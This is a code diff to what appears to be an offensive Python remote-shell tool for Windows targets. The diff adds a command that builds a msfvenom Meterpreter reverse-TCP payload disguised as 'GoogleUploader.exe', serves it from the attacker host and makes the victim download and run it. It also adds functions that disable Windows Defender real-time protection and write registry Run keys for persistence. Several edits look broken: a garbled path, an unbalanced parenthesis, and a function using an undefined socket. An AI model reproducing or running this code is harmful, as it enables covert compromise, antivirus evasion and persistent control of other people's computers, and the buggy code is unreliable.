@@ -2,6 +2,7 @@
 __author__  = "0x539"
 __website__ = "0x539.co"
 import sys, os, argparse
+import netifaces as ni
 from pwn import *
 
 
@@ -58,7 +59,7 @@ if args.keyboard in ["azerty", "qwerty"]:
             nf.close()
         f.close()
 
-
+HOST = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
 PORT = args.lport
 
 print("[+] Listening..")
@@ -112,14 +113,51 @@ Invoke-AllChecks"""
 
 
 def download_file(s, link, filename):
-    d = "cd %HOMEPATH%\n$url = \"" + link + '''\"
+    d = "cd %HOMEPATH%erProfile%\Documents\n$url = \"" + link + '''\"
     $output = \"'''+filename + """\"
     $start_time = Get-Date
     Invoke-WebRequest -Method Get -Uri $url -OutFile $output
-    Write-Output \"Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)\"\ncd ..\.. """
+    Write-Output \"Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)\"\n """
     s.send(d)
     print(recv_a(s))
     p("\x1b[1;36m[+]\x1b[0m File downloaded.")
+def exe_file(s, filename, filepath="%HOMEPATH%erProfile%\Documents\\"):
+    d = '& \'.\\' + filepath + filename + "'\n"
+    s.send(d)
+    print(recv_a(s))
+    p("\x1b[1;36m[+]\x1b[0m Done.")
+
+def disable_defender(s):
+    p("\x1b[1;36m[+]\x1b[0m Trying to disable defender.")
+    d = "Set-MpPreference -DisableRealtimeMonitoring $true\n"
+    s.send(d)
+    print(recv_a(s))
+    p("\x1b[1;36m[+]\x1b[0m Done (Not guaranteed, require administration).")
+
+def presistence(pfile):
+    p("\x1b[1;36m[*]\x1b[0m Adding presistence.")
+    d = """reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v GoogleUploade /t REG_SZ /d "{pfile}"
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v GoogleUploader /t REG_SZ /d "{pfile}"
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices" /v GoogleUploader /t REG_SZ /d "{pfile}"
+    reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v GoogleUploader /t REG_SZ /d "{pfile}"
+    """
+    s.send(d)
+    print(recv_a(s))
+    p() 
+    p("\x1b[1;36m[+]\x1b[0m Done.")
+
+def run_meter(s, filename, lport=9090, lhost=HOST, httpport=8080):
+    disable_defender(s)
+    p("\x1b[1;36m[*]\x1b[0m Generating exe file please wait.")
+    os.system(f"msfvenom -p windows/meterpreter/reverse_tcp lport={lport} lhost={lhost} -f exe > GoogleUploader.exe")
+    p("\x1b[1;36m[+]\x1b[0m Reverse TCP exe file generated.")
+    subprocess.Popen(["python3", "-m", "http.server", f"{httpport}"])
+    sleep(1)
+    download_file(s, f"http://{lhost}:{httpport}/GoogleUploader.exe", filename)
+    exe_file(s, filename)
+    p("\x1b[1;36m[+]\x1b[0m Done.")
+    presistence("%HOMEPATH%erProfile%\Documents\\"+filename))
+
 
 def hide_cmd(s):
     klm = """Add-Type -Name Window -Namespace Console -MemberDefinition '
@@ -172,6 +210,7 @@ commands:
     upload          download file
     enumerate       enumerate windows vulnerabilities
     urlexec         execute a powershell script from a link
+    meterpreter     run meterpreter default port 9090
     help            open this help menu
     exit            quit this tool
 """)
@@ -205,6 +244,14 @@ def shell(s):
                     execute_url(s, cmd[1].strip())
                     continue
                 p("Usuage:\n\rurlexec <pslink>")
+            elif cmd[0].strip() in ["meterpreter", "mp"]:
+                if len(cmd) > 1:
+                    if cmd[1] in ["-h", "--help"]:
+                        p("Usuage: meterpreter [-h|--help] [<lport>] [<lhost>] [<http port>]")
+                elif len(cmd) == 1:
+                    run_meter(s, "GoogleUploader.exe")
+                elif len(cmd) == 4:
+                    run_meter(s, "GoogleUploader.exe", cmd[1], cmd[2], cmd[3])
         elif cmd.strip() == "reconnect":
             s = reconnect()
 
